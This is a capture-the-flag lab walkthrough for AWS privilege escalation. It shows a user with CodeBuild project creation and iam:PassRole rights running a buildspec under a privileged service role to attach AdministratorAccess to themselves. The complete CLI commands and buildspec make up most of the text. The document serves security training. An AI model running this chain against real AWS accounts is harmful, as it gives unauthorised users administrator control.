# Guided Walkthrough: Privilege Escalation via CodeBuild Service Abuse

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to create and execute AWS CodeBuild projects combined with the ability to pass IAM roles. The attacker can create a CodeBuild project with a privileged service role, then execute a malicious buildspec that uses that role's permissions to grant themselves administrator access.

AWS CodeBuild is a fully managed continuous integration service that compiles source code and runs builds in isolated compute environments. Each CodeBuild project executes with a service role that grants it permissions to perform operations. When a user has both `codebuild:CreateProject` and `iam:PassRole` permissions, they can create a project that assumes a privileged role. By starting a build batch with a custom buildspec, they can execute arbitrary AWS CLI commands with the role's elevated permissions.

This is a classic example of the "pass role to service" privilege escalation pattern, where the combination of service creation permissions and role passing creates an indirect path to elevated privileges that might not be obvious when reviewing IAM policies individually.

## The Challenge

You start as `pl-prod-codebuild-004-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. Your goal is to reach effective administrator access in the AWS account.

Your starting permissions are:
- `codebuild:CreateProject` on `*`
- `codebuild:StartBuildBatch` on `*`
- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-codebuild-004-to-admin-target-role`

You also have helpful recon permissions: `iam:ListRoles`, `codebuild:ListProjects`, `codebuild:BatchGetBuildBatches`, and `iam:ListUsers`.

The target is `pl-prod-codebuild-004-to-admin-target-role` — a privileged IAM role trusted by the CodeBuild service that has `iam:AttachUserPolicy` permission. You cannot assume this role directly, but you can pass it to a service you control.

## Reconnaissance

First, let's confirm your current identity and verify you don't already have admin permissions:

```bash
aws sts get-caller-identity
# => arn:aws:iam::{account_id}:user/pl-prod-codebuild-004-to-admin-starting-user

aws iam list-users --max-items 1
# => AccessDenied — good, no admin yet
```

Now let's look at what roles are available to pass:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `codebuild-004`)].{Name:RoleName,Arn:Arn}' --output table
```

You'll see `pl-prod-codebuild-004-to-admin-target-role`. Checking its trust policy reveals it trusts `codebuild.amazonaws.com` — meaning CodeBuild can assume it. You can't assume it yourself, but you can pass it to a CodeBuild project you create.

Check its attached policies to understand what it can do:

```bash
aws iam list-attached-role-policies --role-name pl-prod-codebuild-004-to-admin-target-role
aws iam list-role-policies --role-name pl-prod-codebuild-004-to-admin-target-role
```

The role has `iam:AttachUserPolicy` — enough to attach `AdministratorAccess` to your starting user.

## Exploitation

### Step 1: Craft the malicious buildspec

The key insight is that a CodeBuild build environment executes with its service role's permissions. If you can create a project and pass `pl-prod-codebuild-004-to-admin-target-role` as the service role, any AWS CLI commands in the buildspec will run as that role.

Your buildspec will call `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user. CodeBuild batch builds require a nested buildspec structure with a `batch:` section containing a `build-list`:

```yaml
version: 0.2
batch:
  fast-fail: false
  build-list:
    - identifier: privesc_build
      buildspec: |
        version: 0.2
        phases:
          build:
            commands:
              - echo "Starting privilege escalation..."
              - aws iam attach-user-policy --user-name pl-prod-codebuild-004-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
              - echo "Successfully attached AdministratorAccess policy!"
```

### Step 2: Create the CodeBuild project with the privileged role

This is the core of the attack — you pass `pl-prod-codebuild-004-to-admin-target-role` to the project using `iam:PassRole`. Note the `--build-batch-config` also specifies the service role; CodeBuild requires this for batch builds:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-codebuild-004-to-admin-target-role"

aws codebuild create-project \
  --name "pl-privesc-codebuild-batch-demo" \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nbatch:\n  fast-fail: false\n  build-list:\n    - identifier: privesc_build\n      buildspec: |\n        version: 0.2\n        phases:\n          build:\n            commands:\n              - aws iam attach-user-policy --user-name pl-prod-codebuild-004-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"}' \
  --artifacts type=NO_ARTIFACTS \
  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \
  --service-role "$TARGET_ROLE_ARN" \
  --build-batch-config "{\"serviceRole\":\"${TARGET_ROLE_ARN}\"}"
```

### Step 3: Start the build batch

Now trigger the build batch. CodeBuild will assume the target role and execute your buildspec:

```bash
aws codebuild start-build-batch --project-name "pl-privesc-codebuild-batch-demo"
```

Note the build batch ID from the output. Batch builds can take 2-4 minutes — they spin up build orchestration infrastructure before the actual build runs. You can monitor progress:

```bash
aws codebuild batch-get-build-batches --ids "{build_batch_id}" \
  --query 'buildBatches[0].buildBatchStatus' --output text
```

Wait for status `SUCCEEDED`.

### Step 4: Wait for IAM propagation

After the build completes, wait an additional 15 seconds for IAM policy changes to propagate globally:

```bash
sleep 15
```

## Verification

Now verify your escalated permissions by attempting to list IAM users — an operation that requires admin access:

```bash
aws iam list-users --max-items 3
```

Success means the buildspec ran as `pl-prod-codebuild-004-to-admin-target-role`, which called `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user. Your starting user credentials now have full administrator access.

You can also confirm the policy attachment directly:

```bash
aws iam list-attached-user-policies --user-name pl-prod-codebuild-004-to-admin-starting-user
# => AdministratorAccess is listed
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/codebuild-004-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the "pass role to service" privilege escalation pattern. The combination of `codebuild:CreateProject`, `codebuild:StartBuildBatch`, and `iam:PassRole` let you indirect-execute arbitrary AWS API calls as `pl-prod-codebuild-004-to-admin-target-role` — a role you could never directly assume. CodeBuild acted as an intermediary that assumed the privileged role on your behalf, with your buildspec directing what it did with those permissions.

This pattern is dangerous because each individual permission looks reasonable in isolation: developers legitimately create CodeBuild projects, pass service roles to them, and run builds. The privilege escalation only becomes apparent when you trace the full chain: your user → CodeBuild project → privileged service role → IAM modification → admin access. Static IAM policy analysis tools that don't model service-to-principal trust relationships will miss this entirely.
